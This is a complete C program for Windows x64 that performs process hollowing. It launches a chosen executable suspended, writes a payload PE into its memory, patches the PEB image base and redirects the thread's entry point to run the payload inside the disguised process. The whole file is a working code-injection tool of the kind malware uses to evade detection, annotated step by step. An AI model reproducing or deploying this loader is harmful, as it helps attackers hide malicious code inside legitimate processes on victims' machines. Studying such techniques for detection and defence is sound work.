# include <windows.h>
# include <winternl.h>
# include <stdio.h>

# define FPUTS( msg, ... ) \
	printf( "[-] " msg "\n", ##__VA_ARGS__ ); \
	return -1

# define API_FPUTS( api, msg, ... ) \
	printf( "[-] " api " failed with error: %d\n\tMSG > " msg "\n", GetLastError(), ##__VA_ARGS__ ); \
	goto Cleanup

# define MSG( msg, ... ) \
	printf( "[+] " msg "\n", ##__VA_ARGS__ )


int main( int argc, char* argv[] )
{
	void				*pRemotePayloadBuffer, *hPayloadFile, *pLocalPayloadBuffer = 0; 
	char				*pPayloadFileName, *pTargetFileName, Success;
	unsigned long		ulFileSize, ulProtection, ulOldProtection;
	size_t				szBytesWritten	= 0;
	PPEB				pPEB			= 0;
	CONTEXT				Ctx				= { .ContextFlags = CONTEXT_ALL };
	STARTUPINFOA		Si				= { .cb = sizeof( STARTUPINFOA ) };
	PROCESS_INFORMATION Pi				= { 0 };
	PIMAGE_NT_HEADERS   NtHeaders		= 0;
	PIMAGE_SECTION_HEADER Section		= 0;


	if ( argc != 3 )
	{
		FPUTS( "USAGE: %s <path/to/payload.exe> <path/to/hollow.exe> ", argv[0] );
	}
	pPayloadFileName = argv[1];
	pTargetFileName	 = argv[2];

	Si.dwFlags = STARTF_USESTDHANDLES;

	/*
		Step 1: Read input file from user to buffer
	*/
	if ( ( hPayloadFile = CreateFileA( pPayloadFileName, GENERIC_READ, FILE_SHARE_READ, 0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0 ) ) == INVALID_HANDLE_VALUE )
	{
		API_FPUTS( "CreateFileA", "Could not get a handle to input file -> %s", pPayloadFileName );
	}
	if ( ( ulFileSize = GetFileSize( hPayloadFile, 0 ) ) == INVALID_FILE_SIZE )
	{
		API_FPUTS( "GetFileSize", "Could not get size of %s", pPayloadFileName );
	}
	if ( ( pLocalPayloadBuffer = VirtualAlloc( 0, ulFileSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE ) ) == NULL )
	{
		API_FPUTS( "VirtualAlloc", "Could not allocate %d bytes for %s", ulFileSize, pPayloadFileName );
	}
	if ( !ReadFile( hPayloadFile, pLocalPayloadBuffer, ulFileSize, 0, 0 ) )
	{
		API_FPUTS( "ReadFile", "Could not read %s to %d byte buffer at 0x%p", pPayloadFileName, ulFileSize, pLocalPayloadBuffer );
	}
	MSG( "Read %d bytes from %s to buffer at 0x%p", ulFileSize, pPayloadFileName, pLocalPayloadBuffer );

	if ( ( NtHeaders = ( PIMAGE_NT_HEADERS )( ( char* )pLocalPayloadBuffer + ( ( PIMAGE_DOS_HEADER )pLocalPayloadBuffer )->e_lfanew ) )->Signature != IMAGE_NT_SIGNATURE )
	{
		FPUTS( "Could not validate NT signature on %s", pTargetFileName );
	}

	/*
		Step 2: Create the target process in suspended state
	*/
	if ( !CreateProcessA( pTargetFileName, 0, 0, 0, 0, CREATE_SUSPENDED, 0, 0, &Si, &Pi) )
	{
		API_FPUTS( "CreateProcessA", "Could not spawn %s for hollowing.", pTargetFileName );
	}
	MSG( "Spawned %s process with pid: %d", pTargetFileName, Pi.dwProcessId );

	/*
		Step 3: Allocate memory in the target process at the prefferred base address of the executable payload
	*/

	if ( ( pRemotePayloadBuffer = VirtualAllocEx( Pi.hProcess, ( void* )NtHeaders->OptionalHeader.ImageBase, NtHeaders->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE ) ) == NULL )
	{
		API_FPUTS( "VirtualAllocEx", "Could not allocate memory in %s (%d) for the payload", pTargetFileName, Pi.dwProcessId );
	}
	if ( pRemotePayloadBuffer != ( void* )NtHeaders->OptionalHeader.ImageBase )
	{
		FPUTS( "PE was not loaded in target process at prefferred address: 0x%0.16X", ( unsigned int )NtHeaders->OptionalHeader.ImageBase );
	}
	MSG( "Allocated %d bytes for payload at prefferred address 0x%p in %s (%d)", NtHeaders->OptionalHeader.SizeOfImage, pRemotePayloadBuffer, pTargetFileName, Pi.dwProcessId );

	/*
		Step 4: Write the executable payload to the base address in target process
	*/
	if ( !WriteProcessMemory( Pi.hProcess, pRemotePayloadBuffer, pLocalPayloadBuffer, NtHeaders->OptionalHeader.SizeOfHeaders, &szBytesWritten ) )
	{
		API_FPUTS( "WriteProcessMemory", "Could not copy payload to buffer in %s (%d)", pTargetFileName, Pi.dwProcessId );
	}
	Section = IMAGE_FIRST_SECTION( NtHeaders );
	for ( int i = 0; i < NtHeaders->FileHeader.NumberOfSections; i++ )
	{
		if ( !WriteProcessMemory( Pi.hProcess, ( char* )pRemotePayloadBuffer + Section[i].VirtualAddress, ( char* )pLocalPayloadBuffer + Section[i].PointerToRawData, Section[i].SizeOfRawData, &szBytesWritten ) )
		{
			API_FPUTS( "WriteProcessMemory", "Could not write %s section to memory in %s (%d)", Section[i].Name, pTargetFileName, Pi.dwProcessId );
		}
	}
	MSG( "Wrote payload to buffer" );

	/*
		Step 5: Retrieve the base address of the PEB in the traget process to overwrite the ImageBaseAddress member with our payload.
			    When a process is created in a suspended state, the PEB address is stored in RDX register in x64.

				ImageBaseAddress is the second member of Reserved3[2]. This can be accessed by incrementing Reserved3 + 1. 
	*/
	if ( !GetThreadContext( Pi.hThread, &Ctx ) )
	{
		API_FPUTS( "GetThreadContext", "Could not get context of main thread in %s (%d)", pTargetFileName, Pi.dwProcessId );
	}
	if ( !WriteProcessMemory( Pi.hProcess, ( ( PPEB )( Ctx.Rdx ) )->Reserved3 + 1, &pRemotePayloadBuffer, sizeof( void* ), &szBytesWritten ) )
	{
		API_FPUTS( "WriteProcessMemory", "Could not overwrite image base of address of PEB in %s (%d)", pTargetFileName, Pi.dwProcessId );
	}
	MSG( "Overwrote image base address of PEB in %s (%d) with base address of payload @ 0x%p", pTargetFileName, Pi.dwProcessId, pRemotePayloadBuffer );

	/*
		Step 6: Apply the correct memory permissions for the executable image
	*/
	for ( int i = 0; i < NtHeaders->FileHeader.NumberOfSections; i++ )
	{
		if ( !Section[i].SizeOfRawData || !Section[i].VirtualAddress )
		{
			continue;
		}

		if ( Section[i].Characteristics & IMAGE_SCN_MEM_READ )
			ulProtection = PAGE_READONLY;

		if ( Section[i].Characteristics & IMAGE_SCN_MEM_WRITE )
			ulProtection = PAGE_WRITECOPY;

		if ( Section[i].Characteristics & IMAGE_SCN_MEM_EXECUTE )
			ulProtection = PAGE_EXECUTE;
		
		if ( ( Section[i].Characteristics & IMAGE_SCN_MEM_READ ) && ( Section[i].Characteristics & IMAGE_SCN_MEM_WRITE ) && ( Section[i].Characteristics & IMAGE_SCN_MEM_EXECUTE ) )
			ulProtection = PAGE_EXECUTE_READWRITE;

		if ( ( Section[i].Characteristics & IMAGE_SCN_MEM_READ ) && ( Section[i].Characteristics & IMAGE_SCN_MEM_WRITE ) )
			ulProtection = PAGE_READWRITE;

		if ( ( Section[i].Characteristics & IMAGE_SCN_MEM_READ ) && ( Section[i].Characteristics & IMAGE_SCN_MEM_EXECUTE ) )
			ulProtection = PAGE_EXECUTE_READ;

		if ( ( Section[i].Characteristics & IMAGE_SCN_MEM_WRITE ) && ( Section[i].Characteristics & IMAGE_SCN_MEM_EXECUTE ) )
			ulProtection = PAGE_EXECUTE_WRITECOPY;

		if ( !VirtualProtectEx( Pi.hProcess, ( char* )pRemotePayloadBuffer + Section[i].VirtualAddress, Section[i].SizeOfRawData, ulProtection, &ulOldProtection ) )
		{
			API_FPUTS( "VirtualProtect", "Could not set memory protections on %s section", Section[i].Name );
		}
	}
	MSG( "Applied memory protections to payload" );

	/*
		Step 7: Set RCX register to the address of the payloads entry point. RCX holds the processes entry point when its
				launched in a suspended state.
	*/
	Ctx.Rcx = ( unsigned long long )pRemotePayloadBuffer + NtHeaders->OptionalHeader.AddressOfEntryPoint;
	if ( !SetThreadContext( Pi.hThread, &Ctx ) )
	{
		API_FPUTS( "SetThreadContext", "Could not overwrite RCX with entry point of payload in %s (%d)", pTargetFileName, Pi.dwProcessId );
	}
	MSG( "Overwrote RCX with entry point of payload at 0x%p", ( void* )Ctx.Rcx );

	if ( ResumeThread( Pi.hThread ) == (DWORD)-1 )
	{
		API_FPUTS( "ResumeThread", "Could not resume the main thread in %s (%d)", pTargetFileName, Pi.dwProcessId );
	}
	MSG( "Executed payload!" );
	Success = TRUE;

	WaitForSingleObject(Pi.hProcess, INFINITE);
	
Cleanup:
	if ( hPayloadFile )
		CloseHandle( hPayloadFile );

	if ( pLocalPayloadBuffer )
		VirtualFree( pLocalPayloadBuffer, 0, MEM_RELEASE );

	if ( Pi.hProcess && !Success )
		TerminateProcess( Pi.hProcess, 0 );

	MSG( "Clean exit" );

	return 0;
}